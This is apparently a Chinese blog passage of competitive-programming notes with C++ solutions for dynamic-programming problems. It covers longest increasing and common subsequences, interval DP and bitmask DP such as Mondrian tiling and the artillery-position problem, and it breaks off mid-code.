<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//优化版本时间复杂度(nlogn)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[N],q[N];<span class="comment">//q负责记录每个长度的尾元素的最小值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)cin&gt;&gt;a[i];</span><br><span class="line">    <span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">    q[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> l=<span class="number">-1</span>,r=len+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l+<span class="number">1</span>!=r)&#123;</span><br><span class="line">            <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(q[mid]&lt;a[i])l=mid;<span class="comment">//找到小于a[i]的最大f值,f是严格单调递增的</span></span><br><span class="line">            <span class="keyword">else</span> r=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        len=<span class="built_in">max</span>(len,l+<span class="number">1</span>);<span class="comment">//如果可以更新,则长度加一</span></span><br><span class="line">        q[l+<span class="number">1</span>]=a[i];<span class="comment">//将新的元素接到后面</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="最长上升子序列序列记录"><a href="#最长上升子序列序列记录" class="headerlink" title="最长上升子序列序列记录"></a>最长上升子序列序列记录</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n,dp[N],a[N],g[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;a[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dp[i]=<span class="number">1</span>;<span class="comment">//初始化</span></span><br><span class="line">        g[i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)      </span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[i])&#123;</span><br><span class="line">                 <span class="keyword">if</span>(dp[i]&lt;dp[j]+<span class="number">1</span>)&#123;</span><br><span class="line">                    dp[i]=dp[j]+<span class="number">1</span>;</span><br><span class="line">                    g[i]=j;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125; &#125;</span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;dp[k])k=i;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;dp[k]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,len=dp[k];i&lt;len;i++)&#123;<span class="comment">//要注意要确定以dp[k]为len</span></span><br><span class="line">         cout&lt;&lt;a[k]&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">         k=g[k];   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p><strong>记录路径</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">3010</span>;</span><br><span class="line"><span class="type">int</span> f[N][N],st[N][N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; hh;</span><br><span class="line">string s1, s2;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">0</span>||b==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(st[a][b]==<span class="number">1</span>) &#123;</span><br><span class="line">            hh.<span class="built_in">push</span>(s1[a]);</span><br><span class="line">            <span class="built_in">write</span>(a - <span class="number">1</span>, b - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;&#125;    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(st[a][b]==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">write</span>(a - <span class="number">1</span>, b);</span><br><span class="line">        <span class="keyword">return</span>; &#125;</span><br><span class="line">         <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">write</span>(a, b - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;&#125;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; s1 &gt;&gt; s2;</span><br><span class="line">    n = s1.<span class="built_in">length</span>();</span><br><span class="line">    m = s2.<span class="built_in">length</span>();</span><br><span class="line">    s1 = <span class="string">&quot;#&quot;</span> + s1;</span><br><span class="line">    s2 = <span class="string">&quot;w&quot;</span> + s2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m;j++)&#123;\</span><br><span class="line">        <span class="comment">//要是不记录路径直接一次dp</span></span><br><span class="line">    <span class="comment">/*          dp[i][j]=max(dp[i-1][j],dp[i][j-1]);</span></span><br><span class="line"><span class="comment">        if(a[i]==b[j])dp[i][j]=max(dp[i][j],dp[i-1][j-1]+1);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">            <span class="keyword">if</span>(s1[i]==s2[j])&#123;</span><br><span class="line">                f[i][j] = f[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                st[i][j] = <span class="number">1</span>;     </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(f[i<span class="number">-1</span>][j]&gt;=f[i][j<span class="number">-1</span>]) &#123;</span><br><span class="line">                f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">                st[i][j] = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                f[i][j] = f[i][j - <span class="number">1</span>];</span><br><span class="line">                st[i][j] = <span class="number">3</span>;</span><br><span class="line">            &#125; &#125; &#125;</span><br><span class="line">    <span class="built_in">write</span>(n, m);</span><br><span class="line">    <span class="keyword">while</span>(!hh.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; hh.<span class="built_in">top</span>();</span><br><span class="line">        hh.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最长公共上升子序列"><a href="#最长公共上升子序列" class="headerlink" title="最长公共上升子序列"></a>最长公共上升子序列</h2><p>属性：f[i,j],表示所有由A的前i个字母和B的前j个字母构成的，以b[j]结尾的公共上升子序列</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">3010</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> a[N], b[N], f[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> maxv = <span class="number">1</span>;<span class="comment">//同步更新前j的最大值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n;j++)&#123;</span><br><span class="line">            f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">if</span>(a[i]==b[j])</span><br><span class="line">                f[i][j] = <span class="built_in">max</span>(f[i][j], maxv);</span><br><span class="line">            <span class="keyword">if</span>(b[j]&lt;a[i])</span><br><span class="line">                maxv = <span class="built_in">max</span>(maxv, f[i][j] + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        ans = <span class="built_in">max</span>(ans, f[n][i]);</span><br><span class="line">    cout &lt;&lt; ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="区间dp"><a href="#区间dp" class="headerlink" title="区间dp"></a>区间dp</h2><p>(将n堆石子合并为一堆,每次合并相邻两堆石子,合并的代价是两堆石子的质量和,求最小代价)(0(n^3))</p>
<p>集合:所有将第i堆到第j堆石子合并成一堆石子的合并方式,将这么多方式分成k类,是将每一类的最小代价取min<br>转移方程</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">dp[l][r]=<span class="built_in">min</span>(dp[l][r],dp[l][k]+dp[k+<span class="number">1</span>][r]+s[r]-s[l<span class="number">-1</span>]);<span class="comment">//其中k是起到中介作用,将大区间划分成小区间</span></span><br></pre></td></tr></table></figure>

<p>从小区间开始枚举,k充当的是划分区间的作用,将大区间划分成小区间,通过循环一直更新,递推,最后更新到dp[1][n];<br>要记住k是从i开始,到r-1结束,因为要保证k是第l到r之间的一个分割点</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">310</span>;</span><br><span class="line"><span class="type">int</span> n,s[N],dp[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;s[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)s[i]=s[i<span class="number">-1</span>]+s[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> len=<span class="number">2</span>;len&lt;=n;len++)&#123;<span class="comment">//枚举区间长度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i+len<span class="number">-1</span>&lt;=n;i++)&#123;</span><br><span class="line">            <span class="type">int</span> l=i,r=i+len<span class="number">-1</span>;<span class="comment">//循环区间的左端点</span></span><br><span class="line">            dp[l][r]=<span class="number">1e8</span>;<span class="comment">//初始化</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=r<span class="number">-1</span>;k++)&#123;<span class="comment">//k是从i开始,不是从一开始</span></span><br><span class="line">                dp[l][r]=<span class="built_in">min</span>(dp[l][r],dp[l][k]+dp[k+<span class="number">1</span>][r]+s[r]-s[l<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;dp[<span class="number">1</span>][n];</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="状压DP"><a href="#状压DP" class="headerlink" title="状压DP"></a>状压DP</h2><h3 id="蒙德里安的梦想"><a href="#蒙德里安的梦想" class="headerlink" title="蒙德里安的梦想"></a>蒙德里安的梦想</h3><p> <strong>dp[i][j],所有摆到了第i列,,上一列伸出的小正方形为j(通过二进制表示每一行)的所有方案数</strong> </p>
<p>方程:要判断上一个状态能否转移<br>条件一: 从i-1列升到i列与i-2列升到i-1列不冲突,及(k&amp;j&#x3D;&#x3D;0)<br>条件二: j^k不存在连续奇数个0;(可以预处理)</p>
<p>f[i,j]表示的是从i-1行开始,的横着的小木块,捅到i行的状态表示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//统计把n*m的矩形切成若干个1*2的小矩形,问有多少种方案</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">12</span>, M = <span class="number">1</span> &lt;&lt; N;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ll;</span><br><span class="line">ll dp[N][M];</span><br><span class="line"><span class="type">bool</span> st[M];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m,n||m)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span> dp);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &lt;&lt; n;i++)&#123;</span><br><span class="line">            st[i] = <span class="literal">true</span>;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&gt;&gt;j &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(cnt&amp;<span class="number">1</span>)</span><br><span class="line">                        st[i] = <span class="literal">false</span>;</span><br><span class="line">                    cnt = <span class="number">0</span>;<span class="comment">//当碰到为1的点时,不管cnt是不是奇数,都要清零</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    cnt++;&#125;</span><br><span class="line">            <span class="keyword">if</span>(cnt&amp;<span class="number">1</span>)</span><br><span class="line">                st[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="comment">//就是把中间空余部分为奇数的情况标记一下</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span> &lt;&lt; n;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">1</span> &lt;&lt; n;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>((j&amp;k)==<span class="number">0</span>&amp;&amp;st[j|k])&#123;</span><br><span class="line">                        dp[i][j] += dp[i - <span class="number">1</span>][k];<span class="comment">//状态转移方程</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; dp[m][<span class="number">0</span>]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="hamilton最短"><a href="#hamilton最短" class="headerlink" title="hamilton最短"></a>hamilton最短</h3><p>算是二维的状态压缩dp,以二进制表示所有经过的点 (用一个整数,表示一个所有的状态,但最多到20个表示)<br>dp[i][j]表示从0-j,中间走过的所有点是i,i表示的是一种状态,通过20位二进制数的0&#x2F;1组合来达到走过和没走过的效果<br>要取最小值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">20</span>,M=<span class="number">1</span>&lt;&lt;<span class="number">13</span>;</span><br><span class="line"><span class="type">int</span> w[N][N];</span><br><span class="line"><span class="type">int</span> dp[M][M];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n ;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n;j++)</span><br><span class="line">            cin &gt;&gt; w[i][j];</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dp);</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;<span class="comment">//走过了0这个点,从0到0这个点的方案</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &lt;&lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;&gt;j &amp;<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i-(<span class="number">1</span>&lt;&lt;j)&gt;&gt;k &amp;<span class="number">1</span>)</span><br><span class="line">                        dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i - (<span class="number">1</span> &lt;&lt; j)][k] + w[k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>][n<span class="number">-1</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="棋盘式DP"><a href="#棋盘式DP" class="headerlink" title="棋盘式DP"></a>棋盘式DP</h3><p><a href="https://www.luogu.com.cn/problem/P1896">SCOI2005] 互不侵犯</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">12</span>, M=<span class="number">1</span> &lt;&lt; <span class="number">11</span> , k = <span class="number">110</span>;</span><br><span class="line">vector&lt;ll&gt; state;</span><br><span class="line">ll cnt[M];</span><br><span class="line">vector&lt;ll&gt; head[M];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">ll f[N][k][M];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(ll x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((x&gt;&gt;i&amp;<span class="number">1</span>)&amp;&amp;(x&gt;&gt;i+<span class="number">1</span>&amp;<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="comment">//在这里是预处理M这里面的状态情况,把不相邻的情况打上标记</span></span><br><span class="line"><span class="function">ll <span class="title">count</span><span class="params">(ll x)</span></span>&#123;</span><br><span class="line">    ll cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        cnt += x &gt;&gt; i &amp; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &lt;&lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(i))&#123;</span><br><span class="line">            state.<span class="built_in">push_back</span>(i);</span><br><span class="line">            cnt[i] = <span class="built_in">count</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; state.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; state.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>((state[i]&amp;state[j])==<span class="number">0</span>&amp;&amp;<span class="built_in">check</span>(state[i]|state[j]))&#123;</span><br><span class="line">                head[i].<span class="built_in">push_back</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> z = <span class="number">0</span>; z &lt; state.<span class="built_in">size</span>();z++)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; head[z].<span class="built_in">size</span>();h++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">int</span> c = cnt[state[z]];</span><br><span class="line">                    <span class="keyword">if</span>(j&gt;=c)</span><br><span class="line">                        f[i][j][z] += f[i - <span class="number">1</span>][j - c][head[z][h]];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; f[n+<span class="number">1</span>][m][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="炮兵阵地"><a href="#炮兵阵地" class="headerlink" title="炮兵阵地"></a><a href="https://www.luogu.com.cn/problem/P2704">炮兵阵地</a></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">110</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> M=<span class="number">1</span>&lt;&lt;<span class="number">11</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; state;<span class="comment">//</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;head[M];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> g[N];</span><br><span class="line"><span class="type">int</span> f[<span class="number">2</span>][M][M];</span><br><span class="line"><span class="type">int</span> cnt[M];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="comment">//查一下x,看他是不是满足相隔两个</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((x&gt;&gt;i&amp;<span class="number">1</span>)&amp;&amp;((x&gt;&gt;i+<span class="number">1</span>&amp;<span class="number">1</span>)|(x&gt;&gt;i+<span class="number">2</span>)&amp;<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> st)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (st) &#123;</span><br><span class="line">        <span class="keyword">if</span>(st&amp;<span class="number">1</span>)res++;</span><br><span class="line">        st/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;<span class="comment">//记得写return,调死我了.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="type">char</span> c;</span><br><span class="line">            cin&gt;&gt;c;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&#x27;H&#x27;</span>)g[i]+=<span class="number">1</span>&lt;&lt;j;<span class="comment">//把这些高地全部存为1的状态表示,之后直接和预处理的情况去&amp;判断即可</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1</span>&lt;&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(i))</span><br><span class="line">        &#123;state.<span class="built_in">push_back</span>(i);<span class="comment">//预处理压入</span></span><br><span class="line">       cnt[i]=<span class="built_in">count</span>(i);<span class="comment">//dp方程里面要涉及到每一行的炮车个数,所以要记count</span></span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">2</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;state.<span 